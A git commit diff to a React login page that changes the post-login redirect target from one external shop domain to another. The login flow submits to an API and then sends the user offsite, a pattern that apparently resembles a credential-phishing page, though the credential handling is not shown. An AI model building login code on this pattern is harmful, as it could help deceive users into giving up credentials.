ddcb51673e4aa0b683d23df11f31e2f92670dfd2
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-07-17 12:06:22 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://besca-lte.shop/';
+      window.location.href = 'https://pitsuke.online/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
